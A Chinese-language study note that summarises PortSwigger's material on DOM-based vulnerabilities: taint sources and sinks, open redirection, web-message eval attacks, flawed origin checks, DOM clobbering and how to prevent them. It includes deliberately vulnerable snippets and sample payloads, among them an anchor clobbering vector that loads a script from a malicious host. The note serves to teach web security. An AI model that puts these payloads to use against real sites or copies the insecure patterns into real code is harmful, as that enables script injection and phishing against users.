# 2023-05-23：筆記 PortSwigger 的 DOM-based vulnerabilities.md

Ref:

- https://portswigger.net/web-security/dom-based
- https://portswigger.net/web-security/dom-based/open-redirection
- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
- https://portswigger.net/web-security/dom-based/dom-clobbering

---

## 什麼是 DOM？

Document Object Model (DOM) 是 browser 對頁面上的元素的分層表示

- 網站可以用 JavaScript 來操作 DOM，以及它們的屬性
- 不安全地處理資料的 JavaScript 會導致各種攻擊
- 當網站包含的 JavaScript 獲取攻擊者可控制的值(稱為
  `source`)並將其傳入危險的函數(稱為 `sink`)時，就會出現 DOM-based
  vulnerabilities

---

## What is taint flow ?

為了利用或緩解這些漏洞，首先要熟悉 sources 和匯 sinks 之間污點流(taint
flow)的基本原理

Sources

- 是個 JavaScript property，它接受有可能被攻擊者控制的資料
- 一個 sources 的例子是 `location.search`，它從 query string
  中讀取輸入，是比較容易控制的
- 任何可以被攻擊者控制的屬性都是潛在的 sources

Sinks

- 是潛在的危險的 JavaScript function 或
  DOM，如果攻擊者控制的資料被傳遞給它，就會引起不良的效果
- 如，`eval()` function 是個 sink，因為它處理 JavaScript 傳遞給它的參數
  - `document.body.innerHTML` 就是 HTML sink 例子，它可能讓攻擊者註入惡意的 HTML
    並執行任意 JavaScript

從根本上說

- 當網站將資料從 source 傳到 sink 時，就會產生基於 DOM-based vulnerabilities
  - 然後 sink 中以不安全的方式在 client side sesseion 的背景下處理資料

最常見的 source 是 URL，它通常是通過 `location` 訪問的

- 攻擊者可以構建連結，將受害者導到有漏洞的頁面，在 query string 和 URL
  的部分片段中包含 paylaod

```js
goto = location.hash.slice(1);
if (goto.startsWith("https:")) {
  location = goto;
}
```

這很容易受到
[DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection)
攻擊

- 因為 `location.hash` 被以不安全的方式處理
- 如果 URL 包含以 `https:` 開頭的 hash 片段，這 code 會提取 `location.hash`
  的值並將其設置為 location

攻擊者可以通過以下 URL 來利用這個漏洞：

```
https://www.innocent-website.com/example#https://www.evil-user.net
```

JavaScript 將 `location` 設為 `https://www.evil-user.net`

- 自動將受害者重定向到惡意網站。這種行為很容易被利用來網路釣魚攻擊

---

## 常見的 sources

以下是可利用各種 taint-flow 的典型 sources:

```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

以下幾種資料也可以作為 sources:

- `Reflected data`:
  https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data
- `Stored data`:
  https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data
- `Web messages`:
  https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

---

## 哪些 sink 可以導致 DOM-based vulnerabilities ?

下表提供常見的基於 DOM-based vulnerabilities 的快速概述，以及一個可能導致每個漏洞的 sink 的例子
- (下面左邊欄都是連結，有更稍微詳細的說明。連結就回到原始頁面去點吧 https://portswigger.net/web-security/dom-based )

| DOM-based vulnerability          | Example sink             |
| :------------------------------- | :----------------------- |
| DOM XSS                          | document.write()         |
| Open redirection                 | window.location          |
| Cookie manipulation              | document.cookie          |
| JavaScript injection             | eval()                   |
| Document-domain manipulation     | document.domain          |
| WebSocket-URL poisoning          | WebSocket()              |
| Link manipulation                | element.src              |
| Web message manipulation         | postMessage()            |
| Ajax request-header manipulation | setRequestHeader()       |
| Local file-path manipulation     | FileReader.readAsText()  |
| Client-side SQL injection        | ExecuteSql()             |
| HTML5-storage manipulation       | sessionStorage.setItem() |
| Client-side XPath injection      | document.evaluate()      |
| Client-side JSON injection       | JSON.parse()             |
| DOM-data manipulation            | element.setAttribute()   |
| Denial of service                | RegExp()                 |

---

## 如何防止 DOM-based taint-flow vulnerabilities

沒有單一的方法可以完全消除 DOM-based taint-flow vulnerabilities 的攻擊的威脅
- 一般來說，最有效方法是避免讓來自任何不受信任的來源的資料動態地改變傳輸到任何 sink 的值


如果 app 所需的功能是不可避免的，那必須在 client side 的 code 中防禦
- 相關資料可以在白名單的基礎上進行驗證，只允許已知是安全的內容
- 其他情況下，將有必要對資料進行消毒或 encode
- 這是複雜的任務，根據資料插入的環境，涉及到 JavaScript 轉義、HTML encode 和 URL encode 的組合，以適當的順序進行
- 關於可以採取的預防特定漏洞的措施，參考上表中連結的相應漏洞頁面

---

## DOM clobbering (篡改)

DOM clobbering 是種高級技術
- 你將 HTML inject 到頁面中，操縱 DOM，並最終改變網站上 JavaScript 的行為
- 最常見的 DOM 篡改是用 anchor 元素來覆蓋一個 global variable，然後由 app 以不安全的方式使用，例如產生動態 script URL

---


## 什麼是 DOM-based open redirection ?
當 script 將攻擊者可控制的資料寫入一個可以觸發 cross-domain navigation 的 sink 中時，就會出現 DOM-based open redirection

例如，下面的 code 由於處理 `location.hash` 的方式不安全而存在漏洞：
- 攻擊者可以利用這個構建 URL，如果被其他使用者訪問，將導致重定向到一個任意的外部 domain

```js
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```


---



## DOM-based open redirection 的影響是什麼？

這種行為被利用來網路釣魚攻擊
- 有可能將這個漏洞升級為 JavaScript inject 攻擊，在瀏覽器處理該 URL 時執行任意代碼


---

## 哪些 sinks 可以導致 DOM-based open-redirection vulnerabilities ?

以下是一些主要的 sinks，可以導致 DOM-based open-redirection vulnerabilities:

```js
location;
location.host;
location.hostname;
location.href;
location.pathname;
location.search;
location.protocol;
location.assign();
location.replace();
open();
element.srcdoc;
XMLHttpRequest.open();
XMLHttpRequest.send();
jQuery.ajax();
$.ajax();
```


---

## 如何使用  web messages 作為 source 構建攻擊

考慮下面的 code:
```js
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

這是個漏洞，因為攻擊者可以通過以下 iframe inject JavaScript payload

```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```


由於 event listener 沒有驗證 message 的 origin
- 而 `postMessage()` 指定了 `targetOrigin "*"`，event listener 接受 paylaod 並將其傳遞到 sink 中

---

## Origin 驗證

即使 event listener 確實包括某種形式的 `origin` 驗證
- 這個驗證步驟有時也會有根本性的缺陷

例如：
```js
window.addEventListener("message", function (e) {
  if (e.origin.indexOf("normal-website.com") > -1) {
    eval(e.data);
  }
});
```

`indexOf` 嘗試驗證傳入的 origin 是 `normal-website.com`
- 然而，它只檢查字符 `"normal-website.com"` 是否包含在 origin URL 的任何地方
- 如果攻擊者的惡意的 origin 是 `"http://www.normal-website.com.evil.net"`，就輕易繞過這個驗證
- 同樣的缺陷也適用於依賴 `startsWith()` 或 `endsWith()` 的驗證檢查
  - 例如，下面會將 origin `http://www.malicious-websitenormal-website.com`視為安全
  
```js
window.addEventListener("message", function (e) {
  if (e.origin.endsWith("normal-website.com")) {
    eval(e.data);
  }
});
```


---

## 如何利用 DOM-clobbering 漏洞

JavaScript 開發者常用的一個模式是：

```js
var someObject = window.someObject || {};
```


如果你能控制頁面上的一些 HTML，可以用一個 DOM (如 anchor) 來欺騙 someObject 的引用  

看看下面的 code:
```html
<script>
  window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
  };
</script>
```


為了利用這段易受攻擊的 code，可以 inject 以下 HTML，用 anchor 來破壞 `someObject` 引用：

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```


由於這兩個 anchor **使用相同的 ID**
- DOM 將它們分組在一個 DOM 集合中
- 然後，DOM clobbering vector 用這個 DOM 集合覆蓋了 `someObject` 引用
- 最後一個 anchor 上使用 `name` 屬性，以覆蓋 `someObject` 對象的 `url `屬性，它指向一個外部腳本


另種常見的技術是使用 `form` 和 `input` 來覆蓋 DOM 屬性
- 如，刪除 `attributes` 屬性能夠繞過在邏輯中使用它的 client side filter
- 雖然 filter 會列舉 `attributes` 屬性，但它實際上不會刪除任何 `attributes`
  - 因為該屬性已經被 DOM node 所覆蓋。因此，能夠 inject 通常會被過濾掉的惡意屬性
  
例如：
```html
<form onclick=alert(1)><input id=attributes>Click me
```


在這種情況下，client side filter 將遍歷 DOM 並遇到一個白名單的 `form` 元素
- 通常情況下，filter 會循環瀏覽 form 的屬性'，並刪除任何被列入黑名單的屬性
- 然而，由於 `attributes` 屬性已經被 input 覆蓋了，過濾器就會通過 input 元素進行循環
- 由於 input 有一個未定義的長度，過濾器的 for 循環條件(例如 `i<element.attributes.length`)沒有被滿足
  - filter 只是簡單地轉到下一個元素。這導致 filter 完全忽略了 `onclick` 事件，隨後允許在瀏覽器中呼叫 `alert()`

---

## 如何防止 DOM-clobbering 攻擊

最簡單的說
- 實施檢查來防止 DOMclobbering vulnerabilities 攻擊，以確保 object 或 function 是期望的
- 如，可以檢查 DOM node 的屬性是否真的是 `NamedNodeMap` 的實例
  - 這可以確保該屬性是一個屬性，而不是一個空洞的 HTML 元素
- 也應該避免編寫引用 global variable 與邏輯 OR `||` 結合的 code，這可能會導致 DOM clobbering vulnerabilities 的出現。

綜上所述：

- 檢查 object 和 function 是否合法。如果過濾 DOM，確保檢查 object 或 function 不是一個 DOM node
- 避免不良的 code。應避免將 global variable  與 `||` 結合使用
- 用良好 test 的 library，如 `DOMPurify`，它考慮到了 DOM-clobbering vulnerabilities 的問題。
